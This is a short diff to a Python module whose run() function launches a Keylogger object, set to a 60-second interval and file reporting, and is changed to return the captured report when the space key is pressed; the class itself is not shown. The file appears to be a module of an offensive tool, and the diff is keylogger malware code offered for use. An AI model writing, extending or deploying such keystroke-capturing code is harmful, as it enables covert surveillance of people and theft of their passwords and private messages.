@@ -6,7 +6,9 @@ from datetime import datetime
 
 def run(**args):
     keylogger = Keylogger(interval= 60, report_method="file")
-    return keylogger.start()
+    keylogger.start()
+    if keyboard.is_pressed("space"):
+        return keylogger.report()
     
 
 class Keylogger:
